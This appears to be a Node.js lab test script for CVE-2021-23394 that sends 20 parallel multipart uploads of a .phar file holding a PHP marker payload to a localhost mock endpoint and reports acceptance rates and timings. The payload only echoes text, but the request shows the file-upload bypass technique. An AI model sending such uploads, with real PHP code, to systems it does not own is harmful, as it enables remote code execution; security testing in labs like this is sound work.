#!/usr/bin/env node
/**
 * CVE-2021-23394 Concurrency Test
 * Tests parallel uploads to detect race conditions
 */

const http = require('http');

const TARGET_PORT = 5000;
const CONCURRENT_UPLOADS = 20;

async function uploadFile(id) {
  return new Promise((resolve) => {
    const start = Date.now();
    const filename = `concurrent_${id}_${Date.now()}.phar`;
    const marker = `PWNED_${id}`;
    const payload = `<?php echo "${marker}"; ?>`;
    
    const boundary = '----Boundary' + Math.random().toString(36).substring(7);
    const body = [
      `--${boundary}`,
      `Content-Disposition: form-data; name="upload[]"; filename="${filename}"`,
      `Content-Type: application/octet-stream`,
      '',
      payload,
      `--${boundary}--`
    ].join('\r\n');
    
    const options = {
      hostname: 'localhost',
      port: TARGET_PORT,
      path: '/api/lab/mock/upload',
      method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'Content-Length': Buffer.byteLength(body)
      }
    };
    
    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        const duration = Date.now() - start;
        resolve({
          id,
          status: res.statusCode,
          success: res.statusCode === 200 && data.includes('added'),
          duration,
          filename
        });
      });
    });
    
    req.on('error', (err) => {
      resolve({ id, status: 0, success: false, error: err.message, duration: Date.now() - start });
    });
    
    req.write(body);
    req.end();
  });
}

async function runConcurrencyTest() {
  console.log('\n' + '='.repeat(60));
  console.log('CVE-2021-23394 CONCURRENCY TEST');
  console.log('='.repeat(60));
  console.log(`\nLaunching ${CONCURRENT_UPLOADS} parallel uploads...\n`);
  
  const startTime = Date.now();
  
  const promises = [];
  for (let i = 0; i < CONCURRENT_UPLOADS; i++) {
    promises.push(uploadFile(i));
  }
  
  const results = await Promise.all(promises);
  const totalTime = Date.now() - startTime;
  
  // Analyze results
  const successful = results.filter(r => r.success).length;
  const failed = results.filter(r => !r.success).length;
  const avgDuration = results.reduce((a, r) => a + r.duration, 0) / results.length;
  const maxDuration = Math.max(...results.map(r => r.duration));
  const minDuration = Math.min(...results.map(r => r.duration));
  
  console.log('Results:');
  console.log('-'.repeat(40));
  results.forEach(r => {
    const status = r.success ? '\x1b[32m[OK]\x1b[0m' : '\x1b[31m[FAIL]\x1b[0m';
    console.log(`  Upload #${r.id.toString().padStart(2)}: ${status} ${r.duration}ms`);
  });
  
  console.log('\n' + '='.repeat(60));
  console.log('SUMMARY');
  console.log('='.repeat(60));
  console.log(`  Total uploads:    ${CONCURRENT_UPLOADS}`);
  console.log(`  Successful:       ${successful}`);
  console.log(`  Failed:           ${failed}`);
  console.log(`  Total time:       ${totalTime}ms`);
  console.log(`  Avg per upload:   ${avgDuration.toFixed(0)}ms`);
  console.log(`  Min duration:     ${minDuration}ms`);
  console.log(`  Max duration:     ${maxDuration}ms`);
  console.log(`  Uploads/second:   ${(CONCURRENT_UPLOADS / (totalTime / 1000)).toFixed(1)}`);
  
  if (successful === CONCURRENT_UPLOADS) {
    console.log('\n\x1b[32m*** ALL CONCURRENT UPLOADS SUCCEEDED ***\x1b[0m');
    console.log('Server handles parallel requests without race conditions.\n');
  } else if (successful > 0) {
    console.log('\n\x1b[33m*** PARTIAL SUCCESS ***\x1b[0m');
    console.log('Some uploads failed - possible rate limiting or race condition.\n');
  } else {
    console.log('\n\x1b[31m*** ALL UPLOADS FAILED ***\x1b[0m');
    console.log('Server may be down or blocking requests.\n');
  }
}

runConcurrencyTest();
